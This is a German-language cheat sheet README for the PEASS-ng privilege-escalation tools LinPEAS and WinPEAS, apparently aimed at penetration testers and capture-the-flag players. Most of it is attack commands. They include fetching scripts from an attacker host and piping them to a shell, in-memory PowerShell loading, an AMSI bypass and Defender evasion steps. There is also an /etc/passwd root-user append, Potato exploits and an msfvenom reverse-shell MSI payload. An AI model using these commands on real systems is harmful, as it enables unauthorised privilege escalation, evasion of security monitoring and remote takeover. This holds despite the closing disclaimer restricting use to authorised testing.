<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS & WinPEAS) – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</p>

<p align="center">
  <b>🔍 Die weltweit beliebtesten automatisierten Tools zur Rechteausweitung für Linux- und Windows-Systeme</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-Einführung)
- [Farblegende und Lesen der Ausgabe](#-color-legend--how-to-read-output)
- [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-escalation)
  - [Download & In-Memory-Ausführung](#download--in-memory-execution)
  - [Befehlszeilenoptionen](#command-line-options)
  - [Von LinPEAS geprüfte Kernvektoren](#core-vectors-checked-by-linpeas)
  - [Stealth & AV Evasion](#stealth--av-evasion)
- [WinPEAS (Windows Privilege Escalation)](#-winpeas-windows-privilege-escalation)
  - [Ausführungsmethoden (.exe vs. .bat)](#execution-methods-exe-vs-bat)
  - [WinPEAS im Speicher ausführen](#running-winpeas-in-memory)
  - [Von WinPEAS geprüfte Kernvektoren](#core-vectors-checked-by-winpeas)
  - [Windows Defender und AMSI umgehen](#bypassing-windows-defender--amsi)
- [Befunde mit hoher Priorität interpretieren](#-interpreting-high-priority-findings)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Tipps und Best Practices](#-tips--best-practices)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
- [Ressourcen](#-Ressourcen)

---

## 🎯 Einführung

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE – neue Generation), erstellt von Carlos Polop, ist die De-facto-Standardsammlung automatisierter Prüftools, die zum Aufdecken von Privilegieneskalationsvektoren auf kompromittierten Systemen verwendet werden:

- **LinPEAS:** Ein All-in-One-Bash-Skript, das nach Fehlkonfigurationen, Anmeldeinformationen, beschreibbaren Dateien, SUID-Binärdateien, Kernel-Exploits, Cron-Jobs und Containern auf Linux-/Unix-Systemen sucht.
- **WinPEAS:** Verfügbar als eigenständige kompilierte .NET-Binärdatei (`winPEASany.exe`,

---

## 🎨 Farblegende und Lesen der Ausgabe

Die entscheidende Stärke von PEASS ist sein automatisiertes Farbbewertungssystem:

| Farbe | Bedeutung | Bedeutung |
|-------|--------------|---------|
| 🔴 **ROT/GELB** | 🚨 **KRITISCH (99 % PrivEsc)** | Äußerst zuverlässiger Privilegieneskalationsvektor. Muss sofort überprüft werden! |
| 🔴 **ROT** | ⚠️ **Interessant** | Ungewöhnliche Konfiguration, nicht standardmäßige Einstellung oder Anmeldeinformationskandidat. |
| 🟡 **GELB** | ℹ️ **Informativ** | Auffälliger Befund, der Teil einer Exploit-Kette sein könnte. |
| 🔵 **CYAN / BLAU** | 👥 **Kontext** | Benutzer, Gruppen und Standardsysteminformationen. |

> **Goldene Regel:** Scrollen Sie zuerst direkt zu den **ROTEN/GELBEN** Highlights! Wenn Sie Text mit gelbem Hintergrund und roten Buchstaben sehen, ist ein Exploit-Vektor fast garantiert.

---

## 🐧 LinPEAS (Linux Privilege Escalation)

### Download und In-Memory-Ausführung

Sie müssen `linpeas.sh` selten auf die Festplatte schreiben. Führen Sie es mit Standard-UNIX-Dienstprogrammen direkt im Speicher aus:
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### Befehlszeilenoptionen
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### Von LinPEAS überprüfte Kernvektoren

1. **Sudo-Fehlkonfigurationen (`sudo -l`):**
   - Befehle als Root ohne Passwort ausführbar (`NOPASSWD`).
   – Sudo-Token-Wiederverwendung / CVE-2021-3156 (Baron Samedit).
2. **SUID-/SGID-Binärdateien:**
   - Binärdateien mit Root-Berechtigungen (`chmod +s`). Querverweis auf **GTFOBins**.
3. **Linux-Fähigkeiten:**
   – Binärdateien mit erweiterten Funktionen wie `cap_setuid+ep` (z. B. `python3`, `tar`, `perl`).
4. **Geplante Aufgaben und Timer:**
   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) und beschreibbare geplante Skripte.
   - Systemd-Timer (`systemctl list-timers`).
5. **Pfad- und Umgebungsentführung:**
   - Beschreibbare Verzeichnisse in `$PATH`, relative Befehlssuche in Skripten.
6. **Kernel-Ausnutzung:**
   - Kernel-Version auf bekannte Exploits überprüft (Dirty COW, Dirty Pipe, OverlayFS).
7. **NFS-Root-Squashing:**
   - Freigegebene Verzeichnisse, die mit `no_root_squash` in `/etc/exports` gemountet wurden.
8. **Erfassung von Anmeldeinformationen:**
   - Klartext-Passwörter in `.bash_history`, Konfigurationsdateien (`wp-config.php`, `.env`), SSH-Schlüsseln (`id_rsa`) und Speicherauszügen.

---

## 🪟 WinPEAS (Windows Privilege Escalation)

### Ausführungsmethoden (.exe vs. .bat)

WinPEAS wird in mehreren Formaten bereitgestellt:
- **`winPEASx64.exe` / `winPEASany.exe`:** Geschrieben in C#/.NET. Am umfassendsten; Führt umfassende Registrierungs-, API- und Anmeldeinformationsprüfungen durch.
- **`winPEAS.bat`:** Einfaches Batch-Skript. Hochgradig kompatibel mit älteren Windows-Versionen, erfordert keine .NET-Abhängigkeiten und umgeht bestimmte statische Binärerkennungen.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### WinPEAS im Speicher ausführen

Um das Speichern von Dateien auf der Festplatte auf überwachten Arbeitsstationen zu vermeiden, laden Sie WinPEAS direkt in den PowerShell-Speicher:
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### Von WinPEAS überprüfte Kernvektoren

1. **Dienstberechtigungen und nicht zitierte Pfade:**
   - **Dienstpfade ohne Anführungszeichen:** Dienstbinärpfade mit Leerzeichen und ohne Anführungszeichen (`C:\Program Files\App\service.exe` -> Angreifer platziert `C:\Program.exe`).
   - **Schwache Dienstberechtigungen:** Benutzer ohne Administratorrechte mit `SERVICE_ALL_ACCESS` oder `SERVICE_CHANGE_CONFIG`.
2. **DLL-Hijacking:**
   – Dienste, die versuchen, nicht vorhandene DLLs aus vom Benutzer beschreibbaren Verzeichnissen zu laden.
3. **AlwaysInstallElevated:**
   – Registrierungsschlüssel `AlwaysInstallElevated = 1`, die es jedem Benutzer ermöglichen, erhöhte MSI-Pakete mit `msiexec` zu installieren.
4. **Token-Berechtigungen (SeImpersonate / SeAssignPrimaryToken):**
   – Ausnutzbar über Potato-Exploits (SweetPotato, GodPotato, PrintSpoofer), um von Dienstkonten (`IIS APPPOOL`, `LOCAL SERVICE`) auf `NT AUTHORITY\SYSTEM` hochzustufen.
5. **Anmeldeinformationsspeicher und automatische Anmeldung:**
   - Klartext-Passwörter in der Registrierung (`DefaultPassword` in Winlogon).
   - Gespeicherte RDP-Verbindungen, Vault-Anmeldeinformationen, DPAPI-Blobs, PuTTY-Sitzungen, WLAN-Passwörter.
6. **SAM- und SYSTEM-Sicherungsdateien:**
   - Beschreibbare oder lesbare Kopien von `C:\Windows\Repair\SAM` oder `C:\Windows\System32\config\RegBack\SAM`.

### Umgehen von Windows Defender und AMSI

Windows Defender markiert aktiv kompilierte Versionen von `winPEASx64.exe`. So führen Sie WinPEAS in überwachten Umgebungen aus:
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 Interpretation von Befunden mit hoher Priorität

### 1. LinPEAS: Beschreibbar `/etc/passwd`
Wenn LinPEAS `/etc/passwd` in **ROT/GELB** markiert:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS: `SeImpersonatePrivilege` vorhanden
Wenn Sie `SeImpersonatePrivilege` halten:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS: `AlwaysInstallElevated` Auf 1 gesetzt
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 Kurzreferenztabelle

| Ziel | Befehl | Zweck |
|--------|---------|---------|
| **Linux (Remote)** | `curl -L http://<IP>/linpeas.sh \| sh` | In-Memory-Ausführung ohne Berührung der Festplatte |
| **Linux (Lokal)** | `./linpeas.sh -a > out.txt` | Komplette Prüfung in Textdatei gespeichert |
| **Linux (Schnell)** | `./linpeas.sh -q` | Schneller Scan, der langsame Dateisuchen überspringt |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Schnelle Ausführung mit reduziertem Lärm |
| **Windows (Speicher)**| `[System.Reflection.Assembly]::Load($pe)` | Laden Sie die .NET-Binärdatei über PowerShell | in den Speicher
| **Windows (Batch)** | `winPEAS.bat` | Abhängigkeitsfreie Ausführung für Legacy-/AV-Umgehung |

---

## 💡 Tipps und Best Practices

1. **Überprüfen Sie die Ausgabe mit `less -r`:**
   Wenn Sie die Ausgabe in eine Datei (`./linpeas.sh > linpeas.txt`) umleiten, zeigen Sie sie immer mit `less -r linpeas.txt` oder `cat linpeas.txt` an, damit Terminal-ANSI-Farb-Escape-Codes ordnungsgemäß dargestellt werden.
2. **Übertragung über Port 80/443:**
   Wenn Sie LinPEAS oder WinPEAS auf Ihrer Angreifer-Box bereitstellen, hosten Sie Ihren Webserver auf Port `80` oder `443` und verwenden Sie `python3 -m http.server 80`, um strenge Ausgangsregeln der Ziel-Firewall zu umgehen.
3. **Versteckte Anmeldeinformationen nicht außer Acht lassen:**
   Überprüfen Sie die Abschnitte „Interessante Dateien“ und „Cloud-Anmeldeinformationen“ der LinPEAS-Ausgabe. Oft gewähren Klartext-API-Tokens oder AWS-Anmeldeinformationen höhere Berechtigungen als ein lokaler Exploit.

---

## ⚠️ Rechtlicher Haftungsausschluss

> **WICHTIG:** PEASS-ng-Skripte führen eine umfassende interne Prüfung und Konfigurationserkennung durch. Sie dürfen nur auf Systemen ausgeführt werden, für die Sie bei autorisierten Penetrationstests, CTF-Übungen oder internen Sicherheitsüberprüfungen eine dokumentierte Berechtigung haben.

---

## 📚 Ressourcen

- [Offizielles GitHub-Repository von PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [HackTricks Cloud & Privilege Escalation Bible](https://book.hacktricks.xyz/)
- [GTFOBins – Ausnutzung von Unix-Binärdateien](https://gtfobins.github.io/)
- [LOLBAS – Windows Living Off The Land](https://lolbas-project.github.io/)